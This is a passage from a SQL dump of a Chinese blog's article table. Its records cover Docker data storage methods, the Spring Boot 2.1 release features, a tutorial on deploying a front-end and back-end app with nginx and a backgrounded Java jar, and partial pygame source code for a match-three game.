Docker数据存储方式**    \r\n  在默认情况下，Docker中的数据都是存放在容器层的，但是这样存储数据却有较多的缺陷，具体表现如下。    \r\n  ●当容器不再运行时，容器中的数据无法持久化保存，如果另一个进程需要这些数据，那么将很难从容器中获取数据；  \r\n  ●容器层与正在运行的主机紧密耦合，不能轻易地移动数据；  \r\n  ●容器层需要一个存储驱动程序来管理文件系统，存储驱动程序提供了一个使用Linux内核的联合文件系统，这种额外的抽象化降低了性能。  \r\n  基于上述种种原因，多数情况下Docker数据管理都不会直接将数据写入容器层，而是使用另一种叫做Docker volume数据外部挂载的机制进行数据管理。  \r\n  针对Docker volume数据外部挂载机制，Docker提供了三种不同的方式将数据从容器映射到Docker宿主机，他们分别为：volumes（数据卷）、bind mounts（绑定挂载）和tmpfs mounts（tmpfs挂载）。这三种数据管理方式的具体选择，需要结合实际情况进行考虑，其中的volumes数据卷是最常用也是官方推荐的数据管理方式。无论选择使用哪种数据管理方式，数据在容器内看起来都一样的，而在容器外则会被被挂载到文件系统中的某个目录或文件中。    \r\n  下面通过一张图来展示数据卷、绑定挂载和tmpfs挂载之间的差异，如下图所示。  \r\n![alt](/article_img/docker/8.png)\r\n  从图中可以看出，Docker提供的三种数据管理方式略有不同，具体分析如下。  \r\n  ●volumes：存储在主机文件系统中（在Linux系统下是存在于/var/lib/Docker/volumes/目录），并由Docker管理，非Docker进程无法修改文件系统的这个部分。  \r\n  ●bind mounts：可以存储在主机系统的任意位置，甚至可能是重要的系统文件或目录，在Docker主机或容器上的非Docker进程可以对他们进行任意修改。  \r\n  ●tmpfs mounts：只存储在主机系统的内存中，并没有写入到主机的文件系统中。\r\n\r\n\r\n', '2018-12-07', '2021-05-19', '默认分类', 'Docker,数据管理', 1, 0, NULL, '东方不败', 0);
INSERT INTO `t_article` VALUES (12, 'Spring Boot 2 权威发布', '  如果这两天登录 [https://start.spring.io/ ](https://start.spring.io/ )就会发现，Spring Boot 默认版本已经升到了 2.1.0。这是因为 Spring Boot 刚刚发布了 2.1.0 版本，我们来看下 Spring Boot 2 发布以来第一个子版本都发布了哪些内容？  \r\n\r\n**2.1 中的新特性**     \r\n  ●将spring-boot-starter-oauth2-oidc-client重命名为spring-boot-starter-oauth2-client命名更简洁  \r\n  ●添加 OAuth2 资源服务 starter，OAuth2 一个用于认证的组件  \r\n  ●支持 ConditionalOnBean 和 ConditionalOnMissingBean 下的参数化容器  \r\n  ●自动配置 applicationTaskExecutor bean 的延迟加载来避免不必要的日志记录  \r\n  ●将 DatabaseDriver＃SAP 重命名为 DatabaseDriver  \r\n  ●跳过重启器不仅适用于 JUnit4，也适用于 JUnit5  \r\n  ●在 Jest HealthIndicator 中使用集群端点  \r\n  ●当 DevTools 禁用重启时添加日志输出  \r\n  ●添加注解：@ConditionalOnMissingServletFilter提高 Servlet Filters 的自动装配。\r\n  \r\n**2.1 中的组件升级**  \r\n  ●升级 Hibernate 5.3，Hibernate 的支持升级到了 5.3  \r\n  ●升级 Tomcat 9 ，支持最新的 tomcat 9  \r\n  ●支持 Java 11，Java 现在更新越来越快，Spring 快赶不上了    \r\n  ●升级 Thymeleaf Extras Springsecurity 到 3.0.4.RELEASE ，thymeleaf-extras-springsecurity 是 Thymeleaf 提供集成 Spring Security 的组件  \r\n  ●升级 Joda Time 2.10.1，Joda-Time， 面向 Java 应用程序的日期/时间库的替代选择，Joda-Time 令时间和日期值变得易于管理、操作和理解。  \r\n  ●升级 Lettuce 5.1.2.RELEASE ，Lettuce 前面说过，传说中 Redis 最快的客户端。  \r\n  ●升级 Reactor Californium-SR2 ，Californium 是物联网云服务的 Java COAP 实现。因此，它更专注的是可扩展性和可用性而不是像嵌入式设备那样关注资源效率。不过，Californium 也适合嵌入式的 JVM。  \r\n  ●升级 Maven Failsafe Plugin 2.22.1 ，Maven 中的测试插件。  \r\n  ●升级 Flyway 5.2.1 ， Flyway是一款开源的数据库版本管理工具  \r\n  ●升级 Aspectj 1.9.2 ，AspectJ 是 Java 中流行的 AOP（Aspect-oriented Programming）编程扩展框架，是 Eclipse 托管给 Apache 基金会的一个开源项目。  \r\n  ●升级 Mysql 8.0.13 ，Mysql 支持到 8。  \r\n  ●...  \r\n  更多的详细内容可以参考这里：[Spring Boot 2.1 Release Notes](https://github.com/spring-projects/spring-boot/wiki/Spring-Boot-2.1-Release-Notes)\r\n', '2018-12-12', '2021-05-25', 'SpringBoot', 'Spring Boot 2,2023', 1, 0, NULL, 'tom', 0);
INSERT INTO `t_article` VALUES (37, '服务器项目部署总结（超详细）11', '<div id=\"content_views\" class=\"markdown_views prism-atom-one-dark\">\n<h1><a id=\"_0\"></a>系列文章目录</h1>\n<p><a href=\"https://mp.weixin.qq.com/s/zx5_IfGoXDE-rD3FKEcAwQ\">Linux操作系统笔记【超详细】</a><br /><span style=\"color: black; font-family: 微软雅黑; font-size: medium;\"><br />本篇文章主要从准备篇、项目开发、项目打包、项目部署四个部分去介绍如何把前后端分离的项目部署到阿里云服务器，在服务器上去玩自己的项目。<br />项目最终效果图：输入ip即可访问！！！<br /><img src=\"https://img-blog.csdnimg.cn/20210609162049908.png\" alt=\"在这里插入图片描述\" /></span></p>\n<hr size=\"1&quot;\" />\n<p>&nbsp;</p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul>\n<li><a href=\"#_0\">系列文章目录</a></li>\n<li><a href=\"#_13\">前言</a></li>\n<li><a href=\"#_18\">一、准备篇</a></li>\n<li><a href=\"#_25\">二、项目开发及调试</a></li>\n<li><a href=\"#_31\">三、项目打包</a></li>\n<li><a href=\"#_39\">四、项目部署</a></li>\n<li><a href=\"#_185\">测试</a></li>\n</ul>\n</div>\n<br />\n<p>&nbsp;</p>\n<hr size=\"1&quot;\" />\n<h1><a id=\"_13\"></a>前言</h1>\n<p><span style=\"color: black; font-family: 微软雅黑; font-size: medium;\">部署的大概的步骤流程如下图：<br /><img src=\"https://img-blog.csdnimg.cn/20210609161524142.png\" alt=\"在这里插入图片描述\" /></span></p>\n<hr size=\"1&quot;\" />\n<h1><a id=\"_18\"></a>一、准备篇</h1>\n<p><span style=\"color: black; font-family: 微软雅黑; font-size: small;\">1、阿里云服务器（Linux CentOS 7.3 64bit）<br />2、安装Xshell、Xftp连接工具并成功连接服务器。<br />3、在服务器上安装JDK、Mysql、Redis、Tomcat、Nginx等环境，并确保安装成功！<br />4、Mysql安装成功后，使用Navicat连接工具连接服务器上的Mysql。<br />5、Redis安装成功后，使用RedisDesktopManager连接工具连接服务器上的Reids。</span></p>\n<h1><a id=\"_25\"></a>二、项目开发及调试</h1>\n<p><span style=\"color: black; font-family: 微软雅黑; font-size: small;\">部署的项目是之前做的一个小项目，Vue+SpringBoot前后端分离的项目。<br />1、执行SQL脚本，在服务器mysql上创建表。<br />2、修改Mysql连接配置。修改配置文件application.yml中Mysql数据库url、username、password为你实际服务器上数据库配置。<br />3、修改Redis的连接配置。修改Redis缓存的 host 、 password 等连接信息为你实际服务器上Redis配置。<br />4、本地运行测试。启动前端、后端项目确保项目成功运行。</span></p>\n<h1><a id=\"_31\"></a>三、项目打包</h1>\n<p><span style=\"color: black; font-family: 微软雅黑; font-size: small;\">1、前端项目构建打包。切换到项目根目录下，执行下面命令。</span></p>\n<pre><code class=\"prism language-c\">npm run build<span class=\"token operator\">:</span>prod\n</code></pre>\n<p><span style=\"color: black; font-family: 微软雅黑; font-size: small;\">注：构建打包成功之后，会在根⽬录⽣成 <code>dist</code> ⽂件夹，⾥⾯就是构建打包好的前端项⽬⽂件！<br /><span style=\"color: black; font-family: 微软雅黑; font-size: small;\">2、后端项目构建打包。为了方便起见，Spring Boot 由于自带 Tomcat 应用服务器，项目默认会打包为可执行的 jar 包。<br />切换到项目的根目录，执行 <code>mvn package</code> 命令即可构建打包。构建打包完成并可执行的 <code>jar 包</code>位于<code>target</code>文件夹。</span></span></p>\n<h1><a id=\"_39\"></a>四、项目部署</h1>\n<p><span style=\"color: black; font-family: 微软雅黑; font-size: small;\">1、前端部署。使用Xftp工具将前端打包完成的dist文件夹，上传至服务器的<code>/usr/local/web</code>文件夹下。<br />修改Nginx的配置文件<code>nginx.conf</code>。位于目录<code>/etc/nginx</code><br /><img src=\"https://img-blog.csdnimg.cn/20210609203552741.png\" alt=\"在这里插入图片描述\" /><br />修改配置如下：</span></p>\n<pre><code class=\"prism language-java\"># <span class=\"token class-name\">For</span> more information on configuration<span class=\"token punctuation\">,</span> see<span class=\"token operator\">:</span>\n#   <span class=\"token operator\">*</span> <span class=\"token class-name\">Official</span> <span class=\"token class-name\">English</span> <span class=\"token class-name\">Documentation</span><span class=\"token operator\">:</span> http<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>nginx<span class=\"token punctuation\">.</span>org<span class=\"token operator\">/</span>en<span class=\"token operator\">/</span>docs<span class=\"token operator\">/</span>\n#   <span class=\"token operator\">*</span> <span class=\"token class-name\">Official</span> <span class=\"token class-name\">Russian</span> <span class=\"token class-name\">Documentation</span><span class=\"token operator\">:</span> http<span class=\"token operator\">:</span><span class=\"token operator\">/</span><span class=\"token operator\">/</span>nginx<span class=\"token punctuation\">.</span>org<span class=\"token operator\">/</span>ru<span class=\"token operator\">/</span>docs<span class=\"token operator\">/</span>\n\nuser nginx<span class=\"token punctuation\">;</span>\nworker_processes auto<span class=\"token punctuation\">;</span>\nerror_log <span class=\"token operator\">/</span><span class=\"token keyword\">var</span><span class=\"token operator\">/</span>log<span class=\"token operator\">/</span>nginx<span class=\"token operator\">/</span>error<span class=\"token punctuation\">.</span>log<span class=\"token punctuation\">;</span>\npid  <span class=\"token operator\">/</span>run<span class=\"token operator\">/</span>nginx<span class=\"token punctuation\">.</span>pid<span class=\"token punctuation\">;</span>\n\n# <span class=\"token class-name\">Load</span> dynamic <span class=\"token class-name\"><span class=\"token namespace\">modules<span class=\"token punctuation\">.</span></span> See</span> <span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>share<span class=\"token operator\">/</span>doc<span class=\"token operator\">/</span>nginx<span class=\"token operator\">/</span>README<span class=\"token punctuation\">.</span>dynamic<span class=\"token punctuation\">.</span>\ninclude <span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>share<span class=\"token operator\">/</span>nginx<span class=\"token operator\">/</span>modules<span class=\"token comment\">/*.conf;\n\nevents {\n    worker_connections 1024;\n}\n\nhttp {\n    log_format  main  \'$remote_addr - $remote_user [$time_local] \"$request\" \'\n                      \'$status $body_bytes_sent \"$http_referer\" \'\n                      \'\"$http_user_agent\" \"$http_x_forwarded_for\"\';\n\n    access_log  /var/log/nginx/access.log  main;\n\n    sendfile            on;\n    tcp_nopush          on;\n    tcp_nodelay         on;\n    keepalive_timeout   65;\n    types_hash_max_size 2048;\n\n    include             /etc/nginx/mime.types;\n    default_type        application/octet-stream;\n\n    # Load modular configuration files from the /etc/nginx/conf.d directory.\n    # See http://nginx.org/en/docs/ngx_core_module.html#include\n    # for more information.\n    include /etc/nginx/conf.d/*.conf;\n\n    server {\n        listen       80 default_server;\n        listen       [::]:80 default_server;\n        server_name  118.31.187.5;\n     #  root         /usr/share/nginx/html;\n\n        # Load configuration files for the default server block.\n        include /etc/nginx/default.d/*.conf;\n\n        location / {\n           root   /usr/local/web/dist;\n           try_files $uri $uri/ /index.html;\n           index  index.html;\n        }\n      location /prod-api/ {  # 反向代理到后端工程\n            proxy_set_header Host $http_host;\n            proxy_set_header X-Real-IP $remote_addr;\n            proxy_set_header REMOTE-HOST $remote_addr;\n            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n            proxy_pass http://localhost:8088/;\n        }\n\n\n     #     error_page 404 /404.html;\n    #     location = /404.html {\n    #    }\n\n        error_page 500 502 503 504 /50x.html;\n        location = /50x.html {\n            root html;\n        }\n    }\n\n# Settings for a TLS enabled server.\n#\n#    server {\n#        listen       443 ssl http2 default_server;\n#        listen       [::]:443 ssl http2 default_server;\n#        server_name  _;\n#        root         /usr/share/nginx/html;\n#\n#        ssl_certificate \"/etc/pki/nginx/server.crt\";\n#        ssl_certificate_key \"/etc/pki/nginx/private/server.key\";\n#        ssl_session_cache shared:SSL:1m;\n#        ssl_session_timeout  10m;\n#        ssl_ciphers HIGH:!aNULL:!MD5;\n#        ssl_prefer_server_ciphers on;\n#\n#        # Load configuration files for the default server block.\n#        include /etc/nginx/default.d/*.conf;\n#\n#        location / {\n#        }\n#\n#        error_page 404 /404.html;\n#        location = /404.html {\n#        }\n#\n#        error_page 500 502 503 504 /50x.html;\n#        location = /50x.html {\n#        }\n#    }\n\n}\n\n</span></code></pre>\n<p><span style=\"color: black; font-family: 微软雅黑; font-size: small;\">改动的地方如下：</span></p>\n<pre><code class=\"prism language-c\">  location <span class=\"token operator\">/</span> <span class=\"token punctuation\">{\n    <!-- --></span>\n           root   <span class=\"token operator\">/</span>usr<span class=\"token operator\">/</span>local<span class=\"token operator\">/</span>web<span class=\"token operator\">/</span>dist<span class=\"token punctuation\">;</span>\n           try_files $uri $uri<span class=\"token operator\">/</span> <span class=\"token operator\">/</span>index<span class=\"token punctuation\">.</span>html<span class=\"token punctuation\">;</span>\n           index  index<span class=\"token punctuation\">.</span>html<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n</code></pre>\n<pre><code class=\"prism language-c\"> location <span class=\"token operator\">/</span>prod<span class=\"token operator\">-</span>api<span class=\"token operator\">/</span> <span class=\"token punctuation\">{\n    <!-- --></span>  # 反向代理到后端工程\n            proxy_set_header Host $http_host<span class=\"token punctuation\">;</span>\n            proxy_set_header X<span class=\"token operator\">-</span>Real<span class=\"token operator\">-</span>IP $remote_addr<span class=\"token punctuation\">;</span>\n            proxy_set_header REMOTE<span class=\"token operator\">-</span>HOST $remote_addr<span class=\"token punctuation\">;</span>\n            proxy_set_header X<span class=\"token operator\">-</span>Forwarded<span class=\"token operator\">-</span>For $proxy_add_x_forwarded_for<span class=\"token punctuation\">;</span>\n            proxy_pass http<span class=\"token operator\">:</span><span class=\"token comment\">//localhost:8088/;</span>\n        <span class=\"token punctuation\">}</span>\n</code></pre>\n<p><span style=\"color: black; font-family: 微软雅黑; font-size: small;\">执行如下命令，重新加载 Nginx 使其生效。</span></p>\n<pre><code class=\"prism language-c\">nginx <span class=\"token operator\">-</span>s reload\n</code></pre>\n<p><span style=\"color: black; font-family: 微软雅黑; font-size: small;\">2、后端部署。使用Xftp工具将打包完成的<code>jar包</code>，上传至服务器的<code>/usr/local/web</code>目录下面。<br />使用后台的方式启动后端工程。</span></p>\n<pre><code class=\"prism language-c\">nohup java <span class=\"token operator\">-</span>jar xx_web<span class=\"token punctuation\">.</span>jar <span class=\"token operator\">&gt;</span><span class=\"token operator\">/</span>dev<span class=\"token operator\">/</span>null <span class=\"token number\">2</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&amp;</span><span class=\"token number\">1</span> <span class=\"token operator\">&amp;</span>\n</code></pre>\n<p><span style=\"color: black; font-family: 微软雅黑; font-size: small;\">注：阿里云服务器需要配置安全组，并支持端口访问；比如80，8080，3306、6379端口等。</span></p>\n<hr size=\"1&quot;\" />\n<h1><a id=\"_185\"></a>测试</h1>\n<p><span style=\"color: black; font-family: 微软雅黑; font-size: small;\">在浏览器的地址栏中，访问IP， 即可进入后台管理系统！！！</span></p>\n</div>', '2021-06-12', '2021-07-02', '默认分类', '2021', 1, 1, NULL, NULL, 2);
INSERT INTO `t_article` VALUES (39, 'python消消乐 美轮美奂的界面效果【完整源码+详细流程】', '<div id=\"content_views\" class=\"htmledit_views\"> \n <h2>效果是这样的 ↓ ↓ ↓</h2> \n <h2><img alt=\"\" height=\"626\" src=\"https://img-blog.csdnimg.cn/20210610091237180.gif\" width=\"596\"></h2> \n <h2>一、环境要求</h2> \n <blockquote> \n  <p>windows系统，python3.6+&nbsp; pip21+</p> \n </blockquote> \n <div> \n  <p><strong>开发环境搭建地址</strong></p> \n  <p><a href=\"https://blog.csdn.net/weixin_42350212/article/details/115682970\">一起来学pygame吧 游戏开发30例（开篇词）——环境搭建+游戏效果展示</a></p> \n  <pre><code class=\"language-bash\">安装游戏依赖模块\n\npip install pygame</code></pre> \n </div> \n <h2 id=\"%E6%B8%B8%E6%88%8F%E4%BB%8B%E7%BB%8D\">二、游戏简介</h2> \n <p>消消乐应该大家都玩过，或者看过。这个花里胡哨的小游戏</p> \n <p>用python的pygame来实现，很简单。</p> \n <p>今天带大家，用Python来实现一下这个花里胡哨的小游戏。</p> \n <p>&nbsp;</p> \n <h2 id=\"%E4%B8%89%E3%80%81%E5%AE%8C%E6%95%B4%E5%BC%80%E5%8F%91%E6%B5%81%E7%A8%8B\">三、完整开发流程</h2> \n <h3 id=\"%E9%A1%B9%E7%9B%AE%E4%B8%BB%E7%BB%93%E6%9E%84\">1、项目主结构</h3> \n <p>首先，先整理一下项目的主结构，其实看一下主结构，基本就清晰了</p> \n <div> \n  <pre><code class=\"language-css\">modules：相关定义的Python类位置\n——game.py:主模块\n\nres：存放引用到的图片、音频等等\n——audios:音频资源\n——imgs:图片资源\n——fonts：字体\n\ncfg.py：为主配置文件\n\nxxls.py：主程序文件\n\nrequirements.txt：需要引入的python依赖包</code></pre> \n </div> \n <p><img alt=\"\" height=\"523\" src=\"https://img-blog.csdnimg.cn/20210610091518277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjM1MDIxMg==,size_16,color_FFFFFF,t_70\" width=\"475\"></p> \n <h3>&nbsp;</h3> \n <h3 id=\"%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6\">2、详细配置</h3> \n <p><strong>cfg.py</strong></p> \n <p>配置文件中，需要引入os模块，并且配置打开游戏的屏幕大小。</p> \n <pre><code class=\"language-python\">\'\'\'主配置文件\'\'\'\nimport os\n\n\'\'\'屏幕设置大小\'\'\'\nSCREENSIZE = (700, 700)\n\'\'\'元素尺寸\'\'\'\nNUMGRID = 8\nGRIDSIZE = 64\nXMARGIN = (SCREENSIZE[0] - GRIDSIZE * NUMGRID) // 2\nYMARGIN = (SCREENSIZE[1] - GRIDSIZE * NUMGRID) // 2\n\'\'\'获取根目录\'\'\'\nROOTDIR = os.getcwd()\n\'\'\'FPS\'\'\'\nFPS = 30</code></pre> \n <h3>&nbsp;</h3> \n <h3 id=\"%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E8%BF%B7%E5%AE%AB%E5%9C%B0%E5%9B%BE\">3、消消乐所有图形加载</h3> \n <p><strong>game.py：第一部分</strong></p> \n <p>把整个项目放在一整个game.py模块下了，把这个代码文件拆开解读一下。</p> \n <p>拼图精灵类：首先通过配置文件中，获取方块精灵的路径，加载到游戏里。</p> \n <p>定义move()移动模块的函数，这个移动比较简单。模块之间，只有相邻的可以相互移动。</p> \n <pre><code class=\"language-python\">\'\'\'\nFunction:\n    主游戏\n\'\'\'\nimport sys\nimport time\nimport random\nimport pygame\n\n\n\'\'\'拼图精灵类\'\'\'\nclass pacerSprite(pygame.sprite.Sprite):\n    def __init__(self, img_path, size, position, downlen, **kwargs):\n        pygame.sprite.Sprite.__init__(self)\n        self.image = pygame.image.load(img_path)\n        self.image = pygame.transform.smoothscale(self.image, size)\n        self.rect = self.image.get_rect()\n        self.rect.left, self.rect.top = position\n        self.downlen = downlen\n        self.target_x = position[0]\n        self.target_y = position[1] + downlen\n        self.type = img_path.split(\'/\')[-1].split(\'.\')[0]\n        self.fixed = False\n        self.speed_x = 9\n        self.speed_y = 9\n        self.direction = \'down\'\n    def move(self):\n                #下移\n        if self.direction == \'down\':\n            self.rect.top = min(self.target_y, self.rect.top+self.speed_y)\n            if self.target_y == self.rect.top:\n                self.fixed = True\n                #上移\n        elif self.direction == \'up\':\n            self.rect.top = max(self.target_y, self.rect.top-self.speed_y)\n            if self.target_y == self.rect.top:\n                self.fixed = True\n                #左移\n        elif self.direction == \'left\':\n            self.rect.left = max(self.target_x, self.rect.left-self.speed_x)\n            if self.target_x == self.rect.left:\n                self.fixed = True\n                #右移\n        elif self.direction == \'right\':\n            self.rect.left = min(self.target_x, self.rect.left+self.speed_x)\n            if self.target_x == self.rect.left:\n                self.fixed = True\n    \'\'\'获取当前坐标\'\'\'\n    def getPosition(self):\n        return self.rect.left, self.rect.top\n    \'\'\'设置星星坐标\'\'\'\n    def setPosition(self, position):\n        self.rect.left, self.rect.top = position</code></pre> \n <h3>&nbsp;</h3> \n <h3 id=\"%E5%85%89%E6%A0%87%E6%8E%A7%E5%88%B6%E7%8E%A9%E5%AE%B6\">4、随机生成初始布局、相邻消除、自动下落</h3> \n <p><strong>game.py&nbsp; 第二部分</strong></p> \n <p>设置游戏主窗口启动的标题，设置启动游戏的主方法。</p> \n <pre><code class=\"language-python\">\'\'\'主游戏类\'\'\'\nclass pacerGame():\n    def __init__(self, screen, sounds, font, pacer_imgs, cfg, **kwargs):\n        self.info = \'pacer\'\n        self.screen = screen\n        self.sounds = sounds\n        self.font = font\n        self.pacer_imgs = pacer_imgs\n        self.cfg = cfg\n        self.reset()\n    \'\'\'开始游戏\'\'\'\n    def start(self):\n        clock = pygame.time.Clock()\n        # 遍历整个游戏界面更新位置\n        overall_moving = True\n        # 指定某些对象个体更新位置\n        individual_moving = False\n        # 定义一些必要的变量\n        pacer_selected_xy = None\n        pacer_selected_xy2 = None\n        swap_again = False\n        add_score = 0\n        add_score_showtimes = 10\n        time_pre = int(time.time())\n        # 游戏主循环\n        while True:\n            for event in pygame.event.get():\n                if event.type == pygame.QUIT or (event.type == pygame.KEYUP and event.key == pygame.K_ESCAPE):\n                    pygame.quit()\n                    sys.exit()\n                elif event.type == pygame.MOUSEBUTTONUP:\n                    if (not overall_moving) and (not individual_moving) and (not add_score):\n                        position = pygame.mouse.get_pos()\n                        if pacer_selected_xy is None:\n                            pacer_selected_xy = self.checkSelected(position)\n                        else:\n                            pacer_selected_xy2 = self.checkSelected(position)\n                            if pacer_selected_xy2:\n                                if self.swappacer(pacer_selected_xy, pacer_selected_xy2):\n                                    individual_moving = True\n                                    swap_again = False\n                                else:\n                                    pacer_selected_xy = None\n            if overall_moving:\n                overall_moving = not self.droppacers(0, 0)\n                # 移动一次可能可以拼出多个3连块\n                if not overall_moving:\n                    res_match = self.isMatch()\n                    add_score = self.removeMatched(res_match)\n                    if add_score &gt; 0:\n                        overall_moving = True\n            if individual_moving:\n                pacer1 = self.getpacerByPos(*pacer_selected_xy)\n                pacer2 = self.getpacerByPos(*pacer_selected_xy2)\n                pacer1.move()\n                pacer2.move()\n                if pacer1.fixed and pacer2.fixed:\n                    res_match = self.isMatch()\n                    if res_match[0] == 0 and not swap_again:\n                        swap_again = True\n                        self.swappacer(pacer_selected_xy, pacer_selected_xy2)\n                        self.sounds[\'mismatch\'].play()\n                    else:\n                        add_score = self.removeMatched(res_match)\n                        overall_moving = True\n                        individual_moving = False\n                        pacer_selected_xy = None\n                        pacer_selected_xy2 = None\n            self.screen.fill((135, 206, 235))\n            self.drawGrids()\n            self.pacers_group.draw(self.screen)\n            if pacer_selected_xy:\n                self.drawBlock(self.getpacerByPos(*pacer_selected_xy).rect)\n            if add_score:\n                if add_score_showtimes == 10:\n                    random.choice(self.sounds[\'match\']).play()\n                self.drawAddScore(add_score)\n                add_score_showtimes -= 1\n                if add_score_showtimes &lt; 1:\n                    add_score_showtimes = 10\n                    add_score = 0\n            self.remaining_time -= (int(time.time()) - time_pre)\n            time_pre = int(time.time())\n            self.showRemainingTime()\n            self.drawScore()\n            if self.remaining_time &lt;= 0:\n                return self.score\n            pygame.display.update()\n            clock.tick(self.cfg.FPS)</code></pre> \n <p>&nbsp;</p> \n <p><strong>5、随机初始化消消乐的主图内容。</strong></p> \n <p><strong>game.py&nbsp; 第三部分</strong></p> \n <p>详细注释，都写在代码里了。大家一定要看一遍，不要跑起来，就不管了哦</p> \n <pre><code class=\"language-python\">    \'\'\'初始化\'\'\'\n    def reset(self):\n        # 随机生成各个块(即初始化游戏地图各个元素)\n        while True:\n            self.all_pacers = []\n            self.pacers_group = pygame.sprite.Group()\n            for x in range(self.cfg.NUMGRID):\n                self.all_pacers.append([])\n                for y in range(self.cfg.NUMGRID):\n                    pacer = pacerSprite(img_path=random.choice(self.pacer_imgs), size=(self.cfg.GRIDSIZE, self.cfg.GRIDSIZE), position=[self.cfg.XMARGIN+x*self.cfg.GRIDSIZE, self.cfg.YMARGIN+y*self.cfg.GRIDSIZE-self.cfg.NUMGRID*self.cfg.GRIDSIZE], downlen=self.cfg.NUMGRID*self.cfg.GRIDSIZE)\n                    self.all_pacers[x].append(pacer)\n                    self.pacers_group.add(pacer)\n            if self.isMatch()[0] == 0:\n                break\n        # 得分\n        self.score = 0\n        # 拼出一个的奖励\n        self.reward = 10\n        # 时间\n        self.remaining_time = 300\n    \'\'\'显示剩余时间\'\'\'\n    def showRemainingTime(self):\n        remaining_time_render = self.font.render(\'CountDown: %ss\' % str(self.remaining_time), 1, (85, 65, 0))\n        rect = remaining_time_render.get_rect()\n        rect.left, rect.top = (self.cfg.SCREENSIZE[0]-201, 6)\n        self.screen.blit(remaining_time_render, rect)\n    \'\'\'显示得分\'\'\'\n    def drawScore(self):\n        score_render = self.font.render(\'SCORE:\'+str(self.score), 1, (85, 65, 0))\n        rect = score_render.get_rect()\n        rect.left, rect.top = (10, 6)\n        self.screen.blit(score_render, rect)\n    \'\'\'显示加分\'\'\'\n    def drawAddScore(self, add_score):\n        score_render = self.font.render(\'+\'+str(add_score), 1, (255, 100, 100))\n        rect = score_render.get_rect()\n        rect.left, rect.top = (250, 250)\n        self.screen.blit(score_render, rect)\n    \'\'\'生成新的拼图块\'\'\'\n    def generateNewpacers(self, res_match):\n        if res_match[0] == 1:\n            start = res_match[2]\n            while start &gt; -2:\n                for each in [res_match[1], res_match[1]+1, res_match[1]+2]:\n                    pacer = self.getpacerByPos(*[each, start])\n                    if start == res_match[2]:\n                        self.pacers_group.remove(pacer)\n                        self.all_pacers[each][start] = None\n                    elif start &gt;= 0:\n                        pacer.target_y += self.cfg.GRIDSIZE\n                        pacer.fixed = False\n                        pacer.direction = \'down\'\n                        self.all_pacers[each][start+1] = pacer\n                    else:\n                        pacer = pacerSprite(img_path=random.choice(self.pacer_imgs), size=(self.cfg.GRIDSIZE, self.cfg.GRIDSIZE), position=[self.cfg.XMARGIN+each*self.cfg.GRIDSIZE, self.cfg.YMARGIN-self.cfg.GRIDSIZE], downlen=self.cfg.GRIDSIZE)\n                        self.pacers_group.add(pacer)\n                        self.all_pacers[each][start+1] = pacer\n                start -= 1\n        elif res_match[0] == 2:\n            start = res_match[2]\n            while start &gt; -4:\n                if start == res_match[2]:\n                    for each in range(0, 3):\n                        pacer = self.getpacerByPos(*[res_match[1], start+each])\n                        self.pacers_group.remove(pacer)\n                        self.all_pacers[res_match[1]][start+each] = None\n                elif start &gt;= 0:\n                    pacer = self.getpacerByPos(*[res_match[1], start])\n                    pacer.target_y += self.cfg.GRIDSIZE * 3\n                    pacer.fixed = False\n                    pacer.direction = \'down\'\n                    self.all_pacers[res_match[1]][start+3] = pacer\n                else:\n                    pacer = pacerSprite(img_path=random.choice(self.pacer_imgs), size=(self.cfg.GRIDSIZE, self.cfg.GRIDSIZE), position=[self.cfg.XMARGIN+res_match[1]*self.cfg.GRIDSIZE, self.cfg.YMARGIN+start*self.cfg.GRIDSIZE], downlen=self.cfg.GRIDSIZE*3)\n                    self.pacers_group.add(pacer)\n                    self.all_pacers[res_match[1]][start+3] = pacer\n                start -= 1\n    \'\'\'移除匹配的pacer\'\'\'\n    def removeMatched(self, res_match):\n        if res_match[0] &gt; 0:\n            self.generateNewpacers(res_match)\n            self.score += self.reward\n            return self.reward\n        return 0\n    \'\'\'游戏界面的网格绘制\'\'\'\n    def drawGrids(self):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                rect = pygame.Rect((self.cfg.XMARGIN+x*self.cfg.GRIDSIZE, self.cfg.YMARGIN+y*self.cfg.GRIDSIZE, self.cfg.GRIDSIZE, self.cfg.GRIDSIZE))\n                self.drawBlock(rect, color=(0, 0, 255), size=1)\n    \'\'\'画矩形block框\'\'\'\n    def drawBlock(self, block, color=(255, 0, 255), size=4):\n        pygame.draw.rect(self.screen, color, block, size)\n    \'\'\'下落特效\'\'\'\n    def droppacers(self, x, y):\n        if not self.getpacerByPos(x, y).fixed:\n            self.getpacerByPos(x, y).move()\n        if x &lt; self.cfg.NUMGRID - 1:\n            x += 1\n            return self.droppacers(x, y)\n        elif y &lt; self.cfg.NUMGRID - 1:\n            x = 0\n            y += 1\n            return self.droppacers(x, y)\n        else:\n            return self.isFull()\n    \'\'\'是否每个位置都有拼图块了\'\'\'\n    def isFull(self):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                if not self.getpacerByPos(x, y).fixed:\n                    return False\n        return True\n    \'\'\'检查有无拼图块被选中\'\'\'\n    def checkSelected(self, position):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                if self.getpacerByPos(x, y).rect.collidepoint(*position):\n                    return [x, y]\n        return None\n    \'\'\'是否有连续一样的三个块(无--返回0/水平--返回1/竖直--返回2)\'\'\'\n    def isMatch(self):\n        for x in range(self.cfg.NUMGRID):\n            for y in range(self.cfg.NUMGRID):\n                if x + 2 &lt; self.cfg.NUMGRID:\n                    if self.getpacerByPos(x, y).type == self.getpacerByPos(x+1, y).type == self.getpacerByPos(x+2, y).type:\n                        return [1, x, y]\n                if y + 2 &lt; self.cfg.NUMGRID:\n                    if self.getpacerByPos(x, y).type == self.getpacerByPos(x, y+1).type == self.getpacerByPos(x, 